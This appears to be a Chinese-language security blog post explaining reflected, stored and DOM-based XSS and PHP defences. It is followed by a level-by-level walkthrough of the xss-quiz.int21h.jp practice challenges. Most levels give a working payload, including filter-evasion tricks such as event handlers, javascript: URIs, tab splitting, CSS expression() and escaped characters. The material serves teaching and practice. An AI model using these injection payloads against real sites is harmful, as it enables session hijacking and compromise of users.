---
title: XSS
date: 2017-12-01 19:08:25
categories:
	- OWASP
tags:
	- XSS
---
XSS简单使用<!-- more -->

## 简介
![xss1](http://owrmua5nw.bkt.clouddn.com/xss1.png)
```
XSS成效：js能做的事，xss都能做。
范围：web页面客户端攻击。

```

## 分类
```
1.反射型    恶意代码只执行一次

2.存储型    恶意代码存储在数据库中，若输出页面上，浏览器每刷新一次则解析一次。

3.dom型 这是一种基于DOM树的XSS。
例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，
如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。
DOM型XSS可能是存储型，也有可能是反射型。

```

## 漏洞成因
```
输入的参数未进行过滤直接输出到网页上，被用户浏览器解析。
```

## 攻击场景

1.Reflected
![xss2](http://owrmua5nw.bkt.clouddn.com/xss2.png)

2.Stored
```
存储在数据库，持久性，多出现于留言板，个人信息。
```
![xss3](http://owrmua5nw.bkt.clouddn.com/xss3.gif)

3.DOM
```
<!DOCTYPE html>
<html>
<body>
<script>
function xsstest(){
var str=document.getElementById("text").value;
document.getElementById("t").innerHTML="<a href=' "+str+" '>testlink</a>";
}
</script>
<input type="text" id="text" value=""/>
<input type="button" value="write" onclick="xsstest()">
<div id='t'></div>
</body>
</html>
```

```
源码：  <a href=''>testlink</a>

payload： '//'><img src=1 onerror=alert('xss');//


合成: <a href=' '//'><img src=1 onerror=alert('xss');// '>testlink</a>
' 闭合前面标签//注释后面的'
```
![xss4](http://owrmua5nw.bkt.clouddn.com/xss4.png)


## 防御方法
```
在php中的防御。

$name = htmlspecialchars( $_GET[ 'name' ],ENT_QUOTES );
过滤输入，把html标签实体化，ENT_QUOTES指单引号也需要转义。

htmlspecialchars 函数 

预定义的字符是： 

   & （和号）成为 &amp; 

   " （双引号）成为 &quot; 

   ' （单引号）成为 &#039; 

   < （小于）成为 &lt; 

   > （大于）成为 &gt; 


set httponly防止cookie被盗取。

PHP5
setcookie("user","lxhsec",NULL,NULL,NULL,NULL,True)；
最后一个参数为HttpOnly属性

```

## XSS通关
```
http://xss-quiz.int21h.jp/
```
### 1.
[第一关](http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9)
```
<script>alert(document.domain)</script>
```
### 2.
[第二关](http://xss-quiz.int21h.jp/stage2.php?sid=f2d7d60125bdddb208fa757ee5cdae22f6818cd1)
```
"</input><script>alert(document.domain)</script><input value=""
```

### 3.
[第三关](http://xss-quiz.int21h.jp/stage-3.php?sid=93de7707279b3a5ae4ce419bfc7c0b1f380a20f6)
```
<script>alert(document.domain);</script>

前面的输入框实体化了html标签，故抓包在国家那里插xss，
只要是输入的地方都可能存在漏洞。
```
![x3](http://owrmua5nw.bkt.clouddn.com/x3.png)

### 4.
[第四关](http://xss-quiz.int21h.jp/stage_4.php?sid=be5650b31307cf0ca1927eae2e4b755d72a4162c)
```
抓包在参数p3处插入，需要闭合
"/><script>alert(document.domain);</script>
```

### 5.
[第五关](http://xss-quiz.int21h.jp/stage--5.php?sid=92e1efdf82ec7681dc71fd4b5b15470cce1bbe27)
```
"/><script>alert(document.domain);</script> 
浏览器审查元素改长度。
```
### 6.
[第六关](http://xss-quiz.int21h.jp/stage-no6.php?sid=10284e95452262a58b13c86015336f4489b6152e)
```
123" onfocusin=alert(document.domain)     autofocus x="
123" onfocusout=alert(document.domain)     autofocus x="
123" onblur=alert(document.domain) autofocus  x="
```

### 7.
[第七关](http://xss-quiz.int21h.jp/stage07.php?sid=2e71a47a9c7061dcce2b9205b52f4252bd53b443)
```
123" onfocusin=alert(document.domain)     autofocus x="
```

### 8.
[第八关](http://xss-quiz.int21h.jp/stage008.php?sid=8407d42ea5cf46b072f5a358abffa591a449a2ba)
```
javascript:alert(document.domain); 

js伪协议
```

### 9.
[第九关](http://xss-quiz.int21h.jp/stage_09.php?sid=fcf3010be4306306e9668ee51b9d6916c0b3e129c)
```
" onmousemove="alert(document.domain)
这个它提示是时utf-7..但是我转码utf-7 +号也转成%2b了，还是没过去，不知道为啥，最后用firebug。
```
![x99](http://owrmua5nw.bkt.clouddn.com/x99.png)

### 10.
[第十关](http://xss-quiz.int21h.jp/stage00010.php?sid=718360225fa9356a42c30995f38b5142c3496f6a)
```
"</input><script>alert(document.dodomainmain)</script><input value="
```

### 11.
[第十一关](http://xss-quiz.int21h.jp/stage11th.php?sid=b0a460cbd0a1ced63918634d08b73d98306564c3)
```
"</input><a href="javascr&#09ipt:alert(document.domain);">lxhsec</a><input value="

&#09 制表符。换行符，回车符应该也是可以得。

```

### 12.
[第十二关](http://xss-quiz.int21h.jp/stage_no012.php?sid=92cf5e7d054ddc022223097c5bb5f622b60ac857)
```
``onmousemove=alert(document.domain);

``这个要在ie中才会被解析。
我测试的是ie版本为6.0
```
![xss12](http://owrmua5nw.bkt.clouddn.com/xss12.png)

### 13.
[第十三关](http://xss-quiz.int21h.jp/stage13_0.php?sid=d127ee28ee43f8387eb92452f94b4d33fb5b2463)
```
background-color:salmon;width: expression(alert(document.domain));

expression 也是ie中才有的。。。
```
![x13](http://owrmua5nw.bkt.clouddn.com/x13.png)

### 14.
[第十四关](http://xss-quiz.int21h.jp/stage-_-14.php?sid=88e5796eaebea97fe2b0cd79df9fbc9edad3ab9e)
```
background-color:salmon;width: expres/*123*/sion(alert(document.domain));

注释绕过。。
```

### 15.
[第十五关](http://xss-quiz.int21h.jp/stage__15.php?sid=1e785fb96bdb203c00b034203ee574681d1b4403)
```
\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e

\\ -> \
```

### 16.
[第十六关](http://xss-quiz.int21h.jp/stage00000016.php?sid=ef6e91b383462a2d0855b1611b49193b1940d8e6)
```
hogehoge\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e

js中不仅支持unicode 还支持八进制，十六进制。
```

个人理解，仅供参考。

[参考资料](http://www.freebuf.com/articles/web/20282.html)

